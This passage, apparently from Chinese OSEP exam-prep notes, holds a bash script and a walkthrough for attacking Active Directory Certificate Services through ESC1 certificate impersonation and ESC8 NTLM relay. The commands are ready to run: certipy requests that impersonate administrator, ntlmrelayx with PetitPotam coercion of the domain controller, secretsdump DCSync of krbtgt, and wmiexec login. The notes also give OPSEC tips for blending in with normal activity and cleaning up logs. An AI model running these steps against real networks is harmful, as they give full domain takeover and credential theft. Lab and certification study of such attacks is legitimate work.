# 依赖：certipy（Kali 2023+ 包名 certipy-ad，pipx install certipy-ad；老版叫 certipy，
#       脚本会自动探测两者）；impacket（impacket-ntlmrelayx / impacket-petitpotam /
#       impacket-secretsdump，sudo apt install -y impacket-scripts）；openssl（PFX 拆解）。
# 使用：./m12-adcs-esc1-esc8.sh -m deps
#       ./m12-adcs-esc1-esc8.sh -m find -d corp.local -s DC01.corp.local -u USER -p 'PASS'
#       ./m12-adcs-esc1-esc8.sh -m req  -d corp.local -s DC01.corp.local -c CA01.corp.local \
#            -n 'CORP-CA' -t 'VulnTemplate' -U administrator@corp.local -u USER -p 'PASS' -o admin
#       ./m12-adcs-esc1-esc8.sh -m auth -P admin.pfx -d corp.local -s DC01.corp.local
#       ./m12-adcs-esc1-esc8.sh -m relay -c CA01.corp.local -t Machine -l LHOST -V DC01.corp.local \
#            -d corp.local -s DC01.corp.local -u USER -p 'PASS'
# 占位符（全部经参数传入，脚本内不写真实值）：
#   DOMAIN = 域 FQDN（-d）  TARGET = DC/CA 主机（-s / -c / -V）
#   USER / PASS / NTHASH = 凭据（-u / -p / -H）  LHOST = 攻击机 IP（-l，中继监听主机）
#   URL = 中继目标端点（由 -c 拼出 http://CA01.corp.local/certsrv/certfnsh.asp）
# 测试状态：未在真实 ADCS 环境实测；本机 bash -n 通过。默认只打印命令（-x 才执行），
#           便于先核对 CA 名/模板名再动手。
# 与 docs/12-ad-attacks.md 的差异说明：
#   1) 文档场景 55 只列了 ntlmrelayx 与 petitpotam 两条命令，本脚本 relay 模式还补了
#      "先验证 EPA 是否开启"的前置检查（curl 探测 certsrv 返回码），因为 EPA 是 55 场景
#      的头号失败原因；未开 EPA 才继续起中继。
#   2) 文档 54 场景把 pfx→ccache 含在 auth 步骤里，本脚本拆出 pfx2ccache 模式，把
#      openssl 拆 PEM 与 certipy auth 出 ccache 两步都列清楚。
#   3) 文档中 `-upn administrator@corp.local` 用 -U 传入，默认值为 administrator@<DOMAIN>。
# =============================================================================
set -u

MODE="deps"
DOMAIN=""      # -d
DC=""          # -s  DC（TARGET）
CAHOST=""      # -c  CA 主机（TARGET）
CANAME=""      # -n  CA 名称，如 CORP-CA
TEMPLATE=""    # -t  证书模板名
USER=""        # -u
PASS=""        # -p
NTHASH=""      # -H
UPN=""         # -U  ESC1 要冒充的对象 UPN
PFX=""         # -P  pfx 文件
OUT="admin"    # -o  输出前缀
LHOST=""       # -l  攻击机 IP（中继监听/诱导目标）
VICTIM=""      # -V  被诱导认证的受害者（通常 DC FQDN）
LOOT="$HOME/osep/loot/certs"
EXEC=0         # -x

usage() {
    sed -n '2,30p' "$0" | sed 's/^# \{0,1\}//'
    cat <<'EOF'

参数：
  -m <mode>   模式（默认 deps）：
       deps        依赖自检（certipy / ntlmrelayx / petitpotam / openssl）
       find        枚举模板：certipy find -vulnerable -stdout（场景 54 第一步）
       req         ESC1 申请：certipy req -template ... -upn ...（场景 54 第二步）
       auth        用 PFX 换 NTLM 哈希：certipy auth -pfx（场景 54/55 通用）
       pfx2ccache  PFX -> PEM -> ccache 的完整流转（拿到票去打 -k 工具）
       relay       ESC8：探测 EPA + 起 ntlmrelayx --adcs + 打印触发命令（场景 55）
       all         deps + find + req + auth 的命令串烧（顺序执行需 -x）
  -d <fqdn>    域 FQDN（DOMAIN），find/req/auth/relay 需要
  -s <host>    DC 主机（TARGET），多数模式的 -dc-ip 目标
  -c <host>    CA 主机 FQDN（TARGET），req/relay 需要
  -n <name>    CA 名称（certipy find 输出里的 CA Name），req 需要
  -t <tpl>     证书模板名，req=漏洞模板（如 VulnTemplate），relay=Machine
  -u <user>    域用户（USER）
  -p <pass>    明文密码（PASS）
  -H <hash>    NTHASH（certipy 的 -hashes 形态）
  -U <upn>     ESC1 冒充对象的 UPN，默认 administrator@<DOMAIN>
  -P <file>    PFX 文件路径（auth / pfx2ccache 需要）
  -o <prefix>  输出前缀，默认 admin（产出 admin.pfx）
  -l <ip>      LHOST：攻击机 IP，relay 触发时受害者回连的地址
  -V <host>    被诱导认证的受害者主机（默认取 -s 的 DC）
  -x           真正执行（默认只打印命令）
  -h           本帮助

退出码：0 正常 / 1 参数或依赖错误
EOF
    exit 0
}

err()  { printf '[!] %s\n' "$*" >&2; }
info() { printf '[*] %s\n' "$*"; }
head_() { printf '\n===== %s =====\n' "$*"; }
have() { command -v "$1" >/dev/null 2>&1; }

# 打印命令行：只对含空格/引号的参数加单引号，保证输出能直接复制执行
printable() {
    local out="" a
    for a in "$@"; do
        case "$a" in
            *" "*|*"'"*|*'"'*) out="$out '$a'" ;;
            *)                 out="$out $a" ;;
        esac
    done
    printf '%s\n' "${out# }"
}

run() {
    printable "$@"
    if [ "$EXEC" != "1" ]; then return 0; fi
    if ! have "$1"; then
        err "缺少命令：$1（certipy：pipx install certipy-ad；impacket：sudo apt install -y impacket-scripts）"
        return 0
    fi
    "$@" || err "上一条命令返回非零：按输出排查（CA 名/模板名/权限/EPA）"
    return 0
}

while getopts "m:d:s:c:n:t:u:p:H:U:P:o:l:V:xh" opt; do
    case "$opt" in
        m) MODE="$OPTARG" ;;
        d) DOMAIN="$OPTARG" ;;
        s) DC="$OPTARG" ;;
        c) CAHOST="$OPTARG" ;;
        n) CANAME="$OPTARG" ;;
        t) TEMPLATE="$OPTARG" ;;
        u) USER="$OPTARG" ;;
        p) PASS="$OPTARG" ;;
        H) NTHASH="$OPTARG" ;;
        U) UPN="$OPTARG" ;;
        P) PFX="$OPTARG" ;;
        o) OUT="$OPTARG" ;;
        l) LHOST="$OPTARG" ;;
        V) VICTIM="$OPTARG" ;;
        x) EXEC=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

# certipy 二进制探测：Kali 新版叫 certipy-ad，老环境/手动装叫 certipy
CERTIPY=""
if have certipy; then CERTIPY="certipy"
elif have certipy-ad; then CERTIPY="certipy-ad"
else CERTIPY="certipy"   # 打印用；deps 模式会明确报错
fi

# 凭据：数组形式供真正执行用（不会被 shell 再拆分，口令带空格/特殊字符也安全）
CREDS=()
build_creds() {
    if [ -n "$PASS" ]; then
        CREDS=(-u "$USER@$DOMAIN" -p "$PASS")
    elif [ -n "$NTHASH" ]; then
        CREDS=(-u "$USER@$DOMAIN" -hashes ":$NTHASH")
    else
        CREDS=(-u "$USER@$DOMAIN" -p "PASS")
    fi
}

# 凭据：字符串形式，仅用于"打印给人看"的命令行
creds_fragment() {
    if [ -n "$PASS" ]; then
        printf -- "-u '%s@%s' -p '%s'" "$USER" "$DOMAIN" "$PASS"
    elif [ -n "$NTHASH" ]; then
        printf -- "-u '%s@%s' -hashes ':%s'" "$USER" "$DOMAIN" "$NTHASH"
    else
        printf -- "-u '%s@%s' -p 'PASS'" "$USER" "$DOMAIN"
    fi
}

require() {
    local missing=""
    while [ "$#" -gt 0 ]; do
        case "$1" in
            DOMAIN)  [ -z "$DOMAIN" ]  && missing="$missing -d" ;;
            DC)      [ -z "$DC" ]      && missing="$missing -s" ;;
            CAHOST)  [ -z "$CAHOST" ]  && missing="$missing -c" ;;
            CANAME)  [ -z "$CANAME" ]  && missing="$missing -n" ;;
            TEMPLATE)[ -z "$TEMPLATE" ] && missing="$missing -t" ;;
            USER)    [ -z "$USER" ]    && missing="$missing -u" ;;
            PFX)     [ -z "$PFX" ]     && missing="$missing -P" ;;
            LHOST)   [ -z "$LHOST" ]   && missing="$missing -l" ;;
        esac
        shift
    done
    if [ -n "$missing" ]; then
        err "模式 -m $MODE 缺少必填参数：$missing"
        err "（用 -h 查看各模式需要的参数）"
        exit 1
    fi
}

# ---------------------------------------------------------------------------
mode_deps() {
    head_ "依赖自检（deps）"
    local ok=1
    if [ "$CERTIPY" = "certipy" ] && ! have certipy; then
        err "certipy 未安装：pipx install certipy-ad（Kali 2023+ 命令名 certipy-ad）"
        ok=0
    else
        info "certipy     : $CERTIPY ($(command -v "$CERTIPY"))"
    fi
    for t in impacket-ntlmrelayx impacket-petitpotam impacket-secretsdump openssl curl; do
        if have "$t"; then info "$t : 已安装"; else
            case "$t" in
                openssl|curl) err "$t 缺失：sudo apt install -y $t" ;;
                *)            err "$t 缺失：sudo apt install -y impacket-scripts（或用 python3 -m pip install impacket）" ;;
            esac
            ok=0
        fi
    done
    echo
    info "证书与票据产物目录：${LOOT}（不存在会自动创建）"
    mkdir -p "$LOOT" 2>/dev/null || err "创建 $LOOT 失败（不影响打印模式）"
    if [ "$ok" = "1" ]; then info "依赖齐全。"; else info "有缺失项，按上面的安装命令补齐再继续。"; fi
}

# ---------------------------------------------------------------------------
mode_find() {
    require DOMAIN DC USER
    head_ "模板枚举（find，场景 54 第一步）—— 先全量，再看 -vulnerable"
    build_creds
    info "全量枚举（保留 JSON/文本产物，便于回查 CA Name 与模板列表）："
    run $CERTIPY find "${CREDS[@]}" -dc-ip "$DC" -stdout
    echo
    info "只看可利用项（考试里更常用）："
    run $CERTIPY find "${CREDS[@]}" -dc-ip "$DC" -vulnerable -stdout
    echo
    info "输出到文件（便于 grep）："
    echo "$CERTIPY find $(creds_fragment) -dc-ip $DC -vulnerable -stdout > $LOOT/find-vuln.txt"
    echo "$CERTIPY find $(creds_fragment) -dc-ip $DC -stdout > $LOOT/find-all.txt"
    echo
    info "ESC1 四条件（必须同时满足）："
    info "  ① 模板开启申请者提供 SAN（CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT，能填 -upn）"
    info "  ② EKU 含 Client Authentication（或 Any Purpose）"
    info "  ③ 当前用户/所在组对该模板有 Enroll 权限"
    info "  ④ 未启用 CA 证书管理器审批（否则申请被挂起）"
    info "不满足就别硬试，转 ESC8（场景 55）或回到委派/LAPS 路线。"
}

# ---------------------------------------------------------------------------
mode_req() {
    require DOMAIN DC CAHOST CANAME TEMPLATE USER
    [ -z "$UPN" ] && UPN="administrator@$DOMAIN"
    head_ "ESC1 申请（req，场景 54 第二步）"
    build_creds
    info "冒充对象 UPN：${UPN}（必须是真实存在的用户，DC 会校验）"
    run $CERTIPY req "${CREDS[@]}" -ca "$CANAME" -target "$CAHOST" \
        -template "$TEMPLATE" -upn "$UPN" -dc-ip "$DC" -out "$OUT"
    echo
    info "产出：$OUT.pfx（certipy 无密码保护时直接可用）"
    info "下一步：./m12-adcs-esc1-esc8.sh -m auth -P $OUT.pfx -d $DOMAIN -s $DC"
    echo
    info "失败分支："
    info "  · 0x80094012（证书策略不匹配）-> 模板 EKU 不含客户端认证，换 -t 候选"
    info "  · 权限被拒 -> 当前用户对该模板无 Enroll 权；-U 的 UPN 不存在或不匹配"
    info "  · CA 名/主机解析失败 -> 从 find 输出里取 CA Name 与 DNS 主机名，"
    info "    用 -n / -c 指过去，必要时 /etc/hosts 把 CA FQDN 指到真实 IP"
}

# ---------------------------------------------------------------------------
mode_auth() {
    require PFX DOMAIN DC
    head_ "证书认证（auth）—— 用 PFX 换 NTLM 哈希"
    run $CERTIPY auth -pfx "$PFX" -dc-ip "$DC" -domain "$DOMAIN"
    echo
    info "拿到 NTHASH 后："
    echo "impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH $DOMAIN/Administrator@$DC"
    echo "impacket-wmiexec $DOMAIN/Administrator@$DC -hashes :NTHASH"
    echo
    info "显式指定用户名（UPN 与 sAMAccountName 不一致时）："
    echo "$CERTIPY auth -pfx $PFX -username administrator -domain $DOMAIN -dc-ip $DC"
    echo
    info "失败分支：申请成功但 auth 失败 -> 重跑 req 用 -o 覆盖证书，或显式给 -username。"
}

# ---------------------------------------------------------------------------
mode_pfx2ccache() {
    require PFX DOMAIN DC
    head_ "PFX -> PEM -> ccache 流转（pfx2ccache）"
    info "① 拆 PFX 成 PEM（部分工具/手工核验需要；certipy 默认密码为空）"
    echo "openssl pkcs12 -in $PFX -out ${PFX%.*}.pem -nodes -passin pass:"
    echo "openssl x509 -in ${PFX%.*}.pem -noout -text | head -40     # 看颁发者与 SAN"
    echo
    info "② certipy auth 同时产出哈希与 ccache（ccache 文件名 = 证书里的用户名）"
    run $CERTIPY auth -pfx "$PFX" -dc-ip "$DC" -domain "$DOMAIN"
    echo
    info "③ 用 ccache 打 -k 工具（与 m12-kerberos-tickets-linux.sh 衔接）"
    echo "export KRB5CCNAME=administrator.ccache"
    echo "klist -e"
    echo "impacket-secretsdump -k -no-pass $DC"
    echo "impacket-wmiexec -k -no-pass $DOMAIN/Administrator@$DC"
    echo
    info "确认 SAN 里是不是你要冒充的对象：openssl x509 -in ${PFX%.*}.pem -noout -text | grep -A1 'Subject Alternative Name'"
}

# ---------------------------------------------------------------------------
mode_relay() {
    require CAHOST
    [ -z "$VICTIM" ] && VICTIM="$DC"
    [ -z "$TEMPLATE" ] && TEMPLATE="Machine"
    [ -z "$LHOST" ] && LHOST="LHOST"      # 未给 -l 时按占位符打印
    [ -z "$VICTIM" ] && VICTIM="TARGET"   # 未给 -V/-s 时按占位符打印
    [ -z "$DOMAIN" ] && DOMAIN="DOMAIN"
    head_ "ESC8 中继（relay，场景 55）"
    local url="http://$CAHOST/certsrv/certfnsh.asp"
    info "中继目标 URL：$url"

    echo "# ① 前置：确认 Web Enrollment 存在且未启用 EPA（头号失败原因）"
    echo "curl -s -o /dev/null -w '%{http_code}\\n' http://$CAHOST/certsrv/"
    echo "curl -s -o /dev/null -w '%{http_code}\\n' https://$CAHOST/certsrv/ -k"
    info "期望：HTTP 端点返回 200 或 401；若 HTTPS 必返回 401 且 HTTP 也异常 -> 多半开了 EPA，"
    info "      EPA 下 NTLM 中继会被 CA 拒绝，没有合法绕过路径，直接放弃 ESC8 换其他入口。"
    echo

    echo "# ② 起中继（把收到的认证转发到 ADCS HTTP 注册端点）"
    run impacket-ntlmrelayx -t "$url" --adcs --template "$TEMPLATE" -smb2support -l "$LOOT"
    echo

    echo "# ③ 另开终端，触发受害者（默认 DC 机器账户）向 LHOST 发起认证"
    if [ -n "$USER" ]; then
        run impacket-petitpotam -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" "$LHOST" "$VICTIM"
    else
        echo "impacket-petitpotam -u USER@$DOMAIN -p 'PASS' -dc-ip $DC LHOST $VICTIM"
    fi
    echo "# 备选触发向量（petitpotam 被补丁/防火墙挡时）："
    echo "python3 /opt/PetitPotam/PetitPotam.py -u USER -p PASS -d $DOMAIN LHOST $VICTIM"
    echo "python3 /opt/dementor/dementor.py -u USER -p PASS -d $DOMAIN LHOST $VICTIM"
    echo

    info "④ 中继日志出现 'Got NTLMv2 hash' + 'Server returned certificate' 后："
    info "   证书落在 ${LOOT}（base64 PFX，命名形如 <用户>.pfx）"
    info "   ./m12-adcs-esc1-esc8.sh -m auth -P <证书>.pfx -d $DOMAIN -s $DC"
    echo
    info "失败分支："
    info "  · 触发后无回显/401 -> 疑似 EPA，确认后放弃 ESC8，不要反复重试"
    info "  · 触发成功但证书被拒 -> 模板不允许该受害者注册，--template 换模板"
    info "    （先 certipy find 看哪些模板放 Domain Computers 组）"
    info "  · 无可用触发向量 -> ESC8 不成立，转其他模块入口"
    info "OPSEC：中继日志含凭据哈希，运行目录放 ~/osep/logs 并事后清理；"
    info "      受害者优先选 DC 机器账户（行为上等同正常机器自动注册）。"
}

# ---------------------------------------------------------------------------
case "$MODE" in
    deps)       mode_deps ;;
    find)       mode_find ;;
    req)        mode_req ;;
    auth)       mode_auth ;;
    pfx2ccache) mode_pfx2ccache ;;
    relay)      mode_relay ;;
    all)        mode_deps; mode_find; mode_req; mode_auth ;;
    *)          err "未知模式：$MODE"; usage ;;
esac

printf '\n[*] 模式 %s 结束。默认只打印命令，加 -x 真正执行。\n' "$MODE"
info "产物目录：${LOOT}（证书/PFX 及时导出到攻击机并清理目标侧残留）"
````

## 场景 55：没有可用的 ESC1 模板，但 CA 存在可中继的 HTTP 注册入口（ESC8）

**场景回顾**：目标提供 ADCS Web Enrollment（`http(s)://CA/certsrv/`）；利用 NTLM 中继把受害者的认证中继到注册端点换证书。典型受害者：**DC 机器账户**（中继成功后拿到 DC 身份证书 → 换哈希 → DCSync）。

**前提与假设**：已有一个可用于触发认证的域凭据（普通域用户即可，用于 PetitPotam/PrinterBug）；攻击机能被受害者（通常是 DC 机器账户）主动连接；CA 提供 Web Enrollment 且 EPA 未启用；中继目标模板允许机器账户注册。三者任一不成立，本场景都走不通——先逐条验证再动手。

**ESC8 中继条件**：① CA 开了 HTTP(S) Web Enrollment（`/certsrv/certfnsh.asp`）且**未启用扩展保护（EPA）**——EPA 开启时 NTLM 中继会被 CA 拒绝（HTTP 401），这是本场景头号失败原因；② 中继到的模板允许受害者（DC 机器账户）注册且 EKU 可用于认证；③ 攻击机能触发受害者发起认证（SpoolSample/PetitPotam/DFSCoerce）到**中继监听器**所在主机。

**准备（攻击机侧）**：`impacket-ntlmrelayx`（`--adcs` 集成证书申请）、认证触发脚本（`impacket-petitpotam`/`printerbug`/`dementer`）、`certipy`（用换到的 pfx）；CA FQDN 与 `/etc/hosts` 先配好。

**执行步骤**：
```bash
# ① 起中继：把 SMB 认证转发到 ADCS HTTP 注册端点
impacket-ntlmrelayx -t http://CA01.corp.local/certsrv/certfnsh.asp \
  --adcs --template 'Machine' -smb2support -l /tmp/relay-loot
# ② 触发 DC 认证到攻击机（另开终端）
impacket-petitpotam -u USER@corp.local -p 'PASS' -dc-ip DC01.corp.local \
  LHOST DC01.corp.local
# ③ 中继日志出现 base64 pfx → 落盘 → certipy 换哈希
certipy auth -pfx DC01.pfx -dc-ip DC01.corp.local -domain corp.local
impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH CORP/Administrator@DC01.corp.local
```
**用到的脚本**：`scripts/linux/m12-adcs-esc1-esc8.sh`（relay 模式：起中继 + 触发 + pfx 处理 + 依赖检查）。

**验证**：ntlmrelayx 日志出现 `Got NTLMv2 hash` + `Server returned certificate`；`certipy auth` 输出受害机器账户的 NTLM 哈希；用 DC 哈希 DCSync 成功。

**失败分支与备选**：
- 触发后中继无回显/401 → 疑似 EPA 开启：换 HTTPS 端点仍不行就确认 EPA 后**放弃 ESC8**（EPA 下无合法绕过路径），回到 ESC1/其他入口；别反复重试浪费时间。
- 触发成功但证书申请被拒 → 模板不允许该受害者注册或模板无认证 EKU，`ntlmrelayx --adcs --template` 换模板（先 `certipy find` 看哪些模板放 Domain Computers）。
- 没有可用的触发向量（全部补丁/防火墙挡 RPC）→ ESC8 无受害认证来源即不可行，转其他模块入口。
- 中继拿到的是低价值账户证书 → 换触发目标（域管登录会话触发比较难控，DC 机器账户最稳）。

**考试注意 OPSEC**：`ntlmrelayx` 会接收并转发认证，日志含凭据哈希，运行目录放 `~/osep/logs` 并事后清理；CA 的 HTTP 日志会记录中继来的申请——选择受害者时优先 DC 机器账户（行为上等同正常机器自动注册），避免伪造域管申请留下明显异常。

---

## 附：本模块共用的最小准备清单（攻击机）

```bash
# 一次装齐（Kali）
sudo apt install -y impacket-scripts ldap-utils krb5-user   # 交互里 Realm 填 DOMAIN
pipx install certipy-ad
# DNS 便利：把 DC/CA/目标 FQDN 写进 /etc/hosts（Kerberos 不允许用 IP）
# 票据目录
mkdir -p ~/osep/tickets ~/osep/loot/certs
```
Windows 侧工具（拷到目标主机，来源固定）：`Rubeus.exe`、`SpoolSample.exe`（或 printerbug 单文件）、`SharpHound.exe`（枚举辅助，非必须）。**没有 impacket 就直接 `python3 -m pip install impacket` 用模块调用**，命令名以 Kali 包装版为准（`impacket-wmiexec` 等）。
